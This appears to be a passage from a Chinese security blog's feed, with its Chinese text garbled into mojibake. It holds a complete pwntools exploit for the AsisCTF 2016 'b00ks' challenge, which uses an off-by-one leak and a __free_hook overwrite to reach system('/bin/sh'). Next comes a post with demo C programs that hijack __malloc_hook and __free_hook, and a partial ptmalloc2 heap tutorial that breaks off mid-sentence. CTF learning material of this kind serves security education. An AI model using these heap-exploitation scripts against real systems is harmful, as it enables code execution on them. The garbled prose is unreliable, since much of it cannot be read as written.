é™¤hookï¼Œå¯ä»¥çœ‹åˆ°freeæ±‡ç¼–é‡Œå·²ç»æ²¡æœ‰äº†ï¼Œæ£€æµ‹hook</p><p>æ¢ä¸Šlibc2.23çš„æœºå™¨é‡æ–°è®¡ç®—åç§»ï¼Œæ‹¿åˆ°shell</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302152118170.png" alt="image-20230302152118170"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./b00ks&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0xE15)&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_book</span>(<span class="params">name_size, book_name, desc_size, book_desc</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book name size: &#x27;</span>, <span class="built_in">str</span>(name_size).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book name (Max 32 chars): &#x27;</span>, book_name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book description size: &#x27;</span>, <span class="built_in">str</span>(desc_size).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter book description: &#x27;</span>, book_desc)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_book</span>(<span class="params">book_id</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter the book id you want to delete: &#x27;</span>, <span class="built_in">str</span>(book_id).encode())</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_book</span>(<span class="params">book_id, book_desc</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter the book id you want to edit: &#x27;</span>, <span class="built_in">str</span>(book_id).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter new book description: &#x27;</span>, book_desc)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_book</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_author_name</span>(<span class="params">name</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter author name:&#x27;</span>, name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_author_name</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter author name: &#x27;</span>, name)</span><br><span class="line">input_author_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">create_book(<span class="number">32</span>+<span class="number">0x20</span>+<span class="number">0x90</span>,<span class="string">&#x27;one&#x27;</span>,<span class="number">140</span>,<span class="string">&#x27;onedes&#x27;</span>)</span><br><span class="line">print_book()</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">book_one_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;book_one_ad&#x27;</span>,book_one_ad)</span><br><span class="line">create_book(<span class="number">0x21000</span>, <span class="string">&quot;two&quot;</span>, <span class="number">0x21000</span>, <span class="string">&quot;twodes&quot;</span>)</span><br><span class="line">book_two_ad=book_one_ad+<span class="number">0x30</span></span><br><span class="line">payload=p64(<span class="number">1</span>) + p64(book_two_ad + <span class="number">8</span>)+p64(book_two_ad+<span class="number">16</span>)+ p64(<span class="number">140</span>)</span><br><span class="line">edit_book(<span class="number">1</span>,payload)</span><br><span class="line">change_author_name(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">print_book()</span><br><span class="line">ru(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">vmmap_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;vmmap_ad&#x27;</span>,vmmap_ad)</span><br><span class="line">base=vmmap_ad-<span class="number">0x58F010</span></span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system_ad=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+base</span><br><span class="line">free_hook_ad=libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]+base</span><br><span class="line">bin_ad=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))+base</span><br><span class="line">p(<span class="string">&#x27;bin_ad&#x27;</span>,bin_ad)</span><br><span class="line">edit_book(<span class="number">1</span>,p64(free_hook_ad))</span><br><span class="line">edit_book(<span class="number">2</span>,p64(system_ad))</span><br><span class="line">edit_book(<span class="number">1</span>,p64(bin_ad))</span><br><span class="line">delete_book(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Off By One </tag>
            
            <tag> Free Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloc_hook&amp;&amp;free_hook hijackåŸç†</title>
      <link href="/2023/03/01/malloc-hook&amp;free-hook/"/>
      <url>/2023/03/01/malloc-hook&amp;free-hook/</url>
      
        <content type="html"><![CDATA[<h1 id="malloc-hookå’Œ-free-hook-hijackåŸç†"><a href="#malloc-hookå’Œ-free-hook-hijackåŸç†" class="headerlink" title="__malloc_hookå’Œ__free_hook hijackåŸç†"></a>__malloc_hookå’Œ__free_hook hijackåŸç†</h1><p>Hookå³é’©å­ï¼Œæˆªè·APIè°ƒç”¨çš„æŠ€æœ¯ï¼Œæ˜¯å°†æ‰§è¡Œæµç¨‹åŠ«æŒåˆ°ä½ è‡ªå·±çš„ä»£ç ã€‚</p><p>åˆšå¼€å§‹åœ¨Ubuntu22ä¸Šåšå®éªŒï¼Œä¸€ç›´ä¸æˆåŠŸï¼Œåˆæ¢äº†kaliï¼Œè¿˜æ˜¯ä¸è¡Œï¼Œæœ€åå‘ç°__free_hook,__malloc_hook,__realloc_hook,<em>_memalign_hook,</em>_after_morecore_hookgåœ¨libc-2.34çš„patchä¸­è¢«ç§»é™¤äº†ï¼Œæ¢äº†Ubuntu16 libcç‰ˆæœ¬2.23ï¼Œä½†æ˜¯å‘ç°åªæ˜¯åœ¨ldé“¾æ¥æ—¶ä¼šæ‰¾ä¸åˆ°definitionï¼Œä¹Ÿå°±æ˜¯æ— æ³•é€šè¿‡é“¾æ¥çš„ç¯èŠ‚ï¼Œä½†æ˜¯åœ¨libcåº“é‡Œè¿˜æ˜¯æœ‰çš„ï¼Œå¯èƒ½æ˜¯è€ƒè™‘ä¹‹å‰ä½¿ç”¨hookç¨‹åºçš„å…¼å®¹ã€‚</p><span id="more"></span><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:/usr/include$ ldd --version</span><br><span class="line">ldd (Ubuntu GLIBC 2.23-0ubuntu11.3) 2.23</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure><h2 id="malloc-free"><a href="#malloc-free" class="headerlink" title="malloc free"></a>malloc free</h2><p>å…ˆçœ‹ä¸€ä¸‹mallocå’Œfreeå‡½æ•°å…·ä½“è°ƒç”¨</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">void</span> *x=<span class="built_in">malloc</span>(<span class="number">8</span>); </span><br><span class="line">  <span class="built_in">free</span>(x);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301205645710.png" alt="image-20230301205645710"></p><p>ç”±äºç‰ˆæœ¬ä¸ä¸€æ ·__malloc_hookåœ¨main_arenaçš„ä¸Šæ–¹åç§»æ˜¯ä¸ç¡®å®šçš„ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°åœ¨mallocæ—¶ä¼šä»å–å‡º__malloc_hookçš„å€¼è¿›è¡Œtestï¼Œä¸ä¸º0åˆ™è·³è½¬ï¼Œä¸º0åˆ™ç»§ç»­mallocï¼Œè¿™é‡Œé‡‡ç”¨äº†ripçš„å¯»å€æ–¹å¼ï¼Œå¾ˆ6ï¼Œä¸åˆ©äºæˆ‘ä»¬åˆ†æï¼Œçœ‹é™æ€æ±‡ç¼–å§</p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301210214619.png" alt="image-20230301210214619"></p><p>ä¸ä¸º0è·³è½¬åˆ°ï¼Œä¸º0ç›´æ¥get_free_listå»fastbinsæ‰¾free chunkäº†ï¼ˆ glibc 2.26æ‰å¼•å…¥tcacheï¼‰</p><p> <img src="/2023/03/01/malloc-hook&free-hook/image-20230301210558248.png" alt="image-20230301210558248"></p><p>æœ€åjmpåˆ°malloc_hookåœ°å€å‡½æ•°é‡Œï¼ŒåŒæ—¶rdiçš„å‚æ•°ä¹Ÿæœªå˜ï¼Œå¦‚æœæˆ‘ä»¬æŠŠhookæ”¹ä¸ºsystemåœ°å€ï¼Œé‚£ä¹ˆåªè¦åœ¨mallocæ—¶å¡«å…¥binshåœ°å€å°±å¯ä»¥getshell</p><h3 id="freeåŒç†"><a href="#freeåŒç†" class="headerlink" title="freeåŒç†"></a>freeåŒç†</h3><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301211127857.png" alt="image-20230301211127857"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301211206232.png" alt="image-20230301211206232"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301211304185.png" alt="image-20230301211304185"></p><p>free hookä¸åŒçš„æ˜¯é‡‡ç”¨äº†callçš„å½¢å¼è½¬ç§»pc</p><h2 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc hook"></a>malloc hook</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __malloc_hook =system;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">10</span>]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *s = <span class="built_in">malloc</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o malloc_hook malloc_hook.c </span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301212355513.png" alt="image-20230301212355513"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301212937121.png" alt="image-20230301212937121"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000041F220                               malloc_hook_ini proc near               ; CODE XREF: calloc+2C8â†‘p</span><br><span class="line">.text:000000000041F220                                                                       ; DATA XREF: .data:__malloc_hookâ†“o</span><br><span class="line">.text:000000000041F220                               ; __unwind &#123;</span><br><span class="line">.text:000000000041F220 55                            push    rbp</span><br><span class="line">.text:000000000041F221 53                            push    rbx</span><br><span class="line">.text:000000000041F222 48 89 FD                      mov     rbp, rdi</span><br><span class="line">.text:000000000041F225 48 83 EC 08                   sub     rsp, 8</span><br><span class="line">.text:000000000041F229 8B 05 35 B5 2A 00             mov     eax, cs:__libc_malloc_initialized</span><br><span class="line">.text:000000000041F22F 48 C7 05 4E B5 2A 00 00 00 00+mov     cs:__malloc_hook, 0</span><br><span class="line">.text:000000000041F22F 00</span><br><span class="line">.text:000000000041F23A 85 C0                         test    eax, eax</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™æˆ‘ä»¬å‘ç°malloc_hookå¹¶æ²¡æœ‰ä¸º0ï¼Œè€Œæ˜¯malloc_hook_iniï¼Œä¼šåœ¨mov cs:__malloc_hook, 0 ç½®ä¸º0</p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301213351476.png" alt="image-20230301213351476"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301213534133.png" alt="image-20230301213534133"></p><h2 id="free-hookåŒç†"><a href="#free-hookåŒç†" class="headerlink" title="free hookåŒç†"></a>free hookåŒç†</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *str = <span class="built_in">malloc</span>(<span class="number">160</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(str,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;__free_hook: 0x%016X\n&quot;</span>,__free_hook);</span><br><span class="line">    __free_hook = system;</span><br><span class="line">    <span class="built_in">free</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o free_hook free_hook.c </span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301213905560.png" alt="image-20230301213905560"></p><p><img src="/2023/03/01/malloc-hook&free-hook/image-20230301214108772.png" alt="image-20230301214108772"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Malloc Hook </tag>
            
            <tag> Free Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å †ç®¡ç†å™¨:Ptmalloc2 (HEAP MANAGER)</title>
      <link href="/2023/02/25/23-2-25-heap/"/>
      <url>/2023/02/25/23-2-25-heap/</url>
      
        <content type="html"><![CDATA[<h1 id="HEAP-MANGER"><a href="#HEAP-MANGER" class="headerlink" title="HEAP MANGER"></a>HEAP MANGER</h1><h2 id="ä¸ºä»€ä¹ˆè¦æœ‰å †ç®¡ç†å™¨"><a href="#ä¸ºä»€ä¹ˆè¦æœ‰å †ç®¡ç†å™¨" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æœ‰å †ç®¡ç†å™¨"></a>ä¸ºä»€ä¹ˆè¦æœ‰å †ç®¡ç†å™¨</h2><p>å †æ˜¯åŠ¨æ€åˆ†é…çš„è™šæ‹Ÿå†…å­˜(åªæœ‰åœ¨ç¨‹åºè®¿é—®åˆ°è¿™å—è™šæ‹Ÿå†…å­˜æ—¶ï¼Œç³»ç»Ÿæ‰ä¼šå»ºç«‹è™šæ‹Ÿå†…å­˜å’Œç‰©ç†å†…å­˜çš„æ˜ å°„ï¼Œç§°ä¸ºå»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œå¤§å¤§èŠ‚çœäº†å†…å­˜)ï¼Œä»ä½åœ°å€å‘é«˜åœ°å€ç”Ÿé•¿ï¼Œç¨‹åºå¯èƒ½éœ€è¦é¢‘ç¹çš„å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä¸æ­¤åŒæ—¶å°±ä¼´éšè¿™ä»ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„å¤šæ¬¡è½¬æ¢ï¼Œè½¬æ¢çš„åŒæ—¶éœ€è¦ä¿å­˜contextï¼Œå½±å“ç¨‹åºæ€§èƒ½ï¼Œå †ç®¡ç†å™¨å°±å‡ºç°äº†ï¼Œåœ¨æ“ä½œç³»ç»Ÿå’Œç”¨æˆ·å½“ä½œä¸­é—´äººï¼Œä»–ä¼šç”³è¯·è¾ƒå¤§çš„å†…å­˜ï¼Œç®¡ç†åˆ†é…ï¼Œ1ã€å“åº”ç”¨æˆ·ç”³è¯·å†…å­˜çš„è¯·æ±‚2ã€ç®¡ç†ç”¨æˆ·æ‰€é‡Šæ”¾çš„å†…å­˜ï¼Œå †ç®¡ç†å™¨å¹¶éç”±å†…æ ¸å®ç°çš„ï¼ŒLinuxæ ‡å‡†å‘è¡Œç‰ˆä¸­ä½¿ç”¨çš„å †åˆ†é…å™¨æ˜¯glibcä¸­çš„å †åˆ†é…å™¨ï¼šptmalloc2</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">å¹³å°ï¼šæ“ä½œç³»ç»Ÿ --&gt; å †ç®¡ç†å™¨ --&gt; ç”¨æˆ·</span><br><span class="line">èµ„æºï¼šç‰©ç†å†…å­˜ --&gt; arena  --&gt;å¯ç”¨å†…å­˜</span><br></pre></td></tr></table></figure><span id="more"></span><p><img src="/2023/02/25/23-2-25-heap/image-20230817101448007.png" alt="image-20230817101448007"></p><h2 id="å †ç®¡ç†å™¨ptmalloc2"><a href="#å †ç®¡ç†å™¨ptmalloc2" class="headerlink" title="å †ç®¡ç†å™¨ptmalloc2"></a>å †ç®¡ç†å™¨ptmalloc2</h2><p><strong>arena</strong> æŒ‡çš„æ˜¯ç®¡ç†å™¨åœ¨ç¬¬ä¸€æ¬¡mallocæ—¶ç”³è¯·åˆ°çš„å¤§å†…å­˜å¿«ï¼Œå †å†…å­˜åŒºåŸŸæœ¬èº«ï¼Œå¹¶ä¸æ˜¯ç»“æ„ï¼Œå¯ä»¥ç†è§£ä¸ºå†…å­˜æ± ï¼›ä¸»çº¿ç¨‹çš„ main arenaé€šè¿‡&#x3D;&#x3D;(s)brk&#x3D;&#x3D;åˆ›å»ºï¼Œæ²¡å¼€alsråˆ†å¸ƒåœ¨æ•°æ®åŒº(.data&#x2F;.bss)çš„ç»“å°¾ï¼Œå¼€å¯ååœ¨å°¾éƒ¨éšæœºåç§»å¤„ï¼›å…¶ä»–çº¿ç¨‹çš„ arenaåŒ…æ‹¬ä¸€äº›ä¸»çº¿ç¨‹çš„å¤§å†…å­˜ æ˜¯é€šè¿‡ &#x3D;&#x3D;mmap&#x3D;&#x3D; åˆ›å»ºï¼Œåˆ†å¸ƒåœ¨Memory-mapped segmentï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬glicåŠ¨æ€é“¾æ¥åº“åŠ è½½çš„åŒºåŸŸ</p><p><strong>malloc_state</strong>ï¼ˆ<strong>main arena</strong> <strong>çš„</strong> <strong>malloc_state</strong> <strong>å¹¶ä¸æ˜¯</strong> <strong>heap segment</strong> <strong>çš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå­˜å‚¨åœ¨</strong> <strong>libc.so</strong> <strong>çš„æ•°æ®æ®µ</strong>ï¼‰ç®¡ç† arena çš„æ ¸å¿ƒç»“æ„ï¼ŒåŒ…å«å †çš„çŠ¶æ€ä¿¡æ¯ã€bins é“¾è¡¨ç­‰ï¼›main arena å¯¹åº”çš„ malloc state ç»“æ„å­˜å‚¨åœ¨ glibc å…¨å±€å˜é‡ä¸­ï¼›å…¶ä»–çº¿ç¨‹ arena å¯¹åº”çš„ malloc_state å­˜å‚¨åœ¨ arena æœ¬èº«ä¸­</p><p><strong>bin</strong> ç”¨æ¥ç®¡ç†ç©ºé—²å†…å­˜å—ï¼Œé€šå¸¸ç”¨é“¾è¡¨çš„ç»“æ„æ¥è¿›è¡Œç»„ç»‡</p><p><strong>chunks</strong> å†…å­˜å—ç»“æ„ï¼Œæ˜¯mallocå…·ä½“åœ¨arenaä¸Šç”³è¯·ç»™ç”¨æˆ·çš„</p><h2 id="chunks"><a href="#chunks" class="headerlink" title="chunks"></a>chunks</h2><p>top chunk arenaä¸­ä»æœªè¢«ä½¿ç”¨è¿‡çš„å†…å­˜åŒºåŸŸï¼Œinuse æ¯”ç‰¹ä½å§‹ç»ˆä¸º 1ï¼Œå¦åˆ™ä¼šåˆå¹¶æ—è¾¹çš„chunk</p><p>malloc_chunk å·²è¢«åˆ†é…ä¸”å¡«å†™äº†ç›¸åº”æ•°æ®çš„chunk</p><p>free chunk è¢«é‡Šæ”¾æ‰çš„malloced chunk</p><p><code>allocated chunk</code>æ˜¯ä¸€ä¸ªæ›´åŠ é€šç”¨çš„æœ¯è¯­ï¼Œå®ƒå¯ä»¥æŒ‡ä»»ä½•å·²ç»è¢«åˆ†é…ç»™åº”ç”¨ç¨‹åºä½¿ç”¨çš„å†…å­˜å—ã€‚</p><p>last remainder chunk mallocåˆ†å‰²åŸchunkåå‰©ä½™çš„éƒ¨åˆ†</p><img src="/2023/02/25/23-2-25-heap/image-20230225112707364.png" alt="image-20230225112707364" style="zoom:67%;"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">    <span class="comment">/*above chunkâ€”â€”head*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> <span class="title function_">unallocated</span> <span class="params">(P clear)</span>  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             <span class="params">(malloc_usable_size() bytes)</span>                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="params">(size of chunk, but used <span class="keyword">for</span> application data)</span>    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><ul><li><p>prev_size</p><ul><li><blockquote><p>å¦‚æœè¯¥ chunk çš„<strong>ç‰©ç†ç›¸é‚»çš„å‰ä¸€åœ°å€ chunkï¼ˆä¸¤ä¸ªæŒ‡é’ˆçš„åœ°å€å·®å€¼ä¸ºå‰ä¸€chunk å¤§å°ï¼‰</strong>æ˜¯ç©ºé—²çš„è¯ï¼Œé‚£è¯¥å­—æ®µè®°å½•çš„æ˜¯å‰ä¸€ä¸ªchunk çš„å¤§å° (åŒ…æ‹¬chunkå¤´)ã€‚å¦åˆ™ï¼Œè¯¥å­—æ®µå¯ä»¥ç”¨æ¥å­˜å‚¨ç‰©ç†ç›¸é‚»çš„å‰ä¸€ä¸ªchunk çš„æ•°æ®ã€‚<strong>è¿™é‡Œçš„å‰ä¸€ chunk æŒ‡çš„æ˜¯è¾ƒä½åœ°å€çš„ chunk</strong> ï¼Œä¹Ÿå°±æ˜¯å½“å‰ä¸€ä¸ªchunkæ˜¯mallocedï¼Œé‚£ä¹ˆè¿™ä¸ªå­—æ®µæ˜¯æ— ç”¨çš„ï¼Œä¸ºäº†ä¸æµªè´¹ï¼Œæˆ‘ä»¬ä¼šæŠŠè¿™å—å†…å­˜åœ¨å¿…è¦æ—¶ç»™åˆ°å‰ä¸€ä¸ªchunkï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨64ä½ç¨‹åºä¸‹ï¼Œmalloc(0x10)ï¼Œå®é™…ä¼šåˆ†é…0x20ä¸ªå­—èŠ‚ï¼Œä¼šåŒ…æ‹¬chunk_headï¼Œfreeæ‰åï¼Œæˆ‘ä»¬å†æ¬¡malloc(0x18)ï¼Œè¯¥chunkçš„é«˜åœ°å€å¤„çš„chunkçš„pre_sizeå­—æ®µæ˜¯æ— ç”¨çš„ï¼Œä¼šè¢«åˆ©ç”¨èµ·æ¥ï¼Œä¹Ÿå°±æ˜¯ä¼šå†æ¬¡æŠŠä¹‹å‰malloc(0x10)çš„chunkç»™åˆ°æˆ‘ä»¬ï¼Œ<strong>è¿™å°±æ˜¯ chunk ä¸­çš„ç©ºé—´å¤ç”¨</strong></p></blockquote></li></ul></li><li><p>size</p><ul><li><blockquote><p>chunkçš„å¤§å°åŒ…æ‹¬chunk_headï¼Œæ˜¯å®‰ç…§2 * SIZE_SZ(å­—é•¿)å¯¹é½çš„ï¼Œä¹Ÿå°±æ˜¯32ä½æ˜¯0x8ï¼Œ64ä½æ˜¯0x10ï¼Œæ’æ˜¯8çš„å€æ•°ï¼Œè¿™æ ·åä¸‰ä½bitä½æ’ä¸º0ï¼Œæˆ‘ä»¬å°†å…¶è®¾ç½®ä¸ºæ 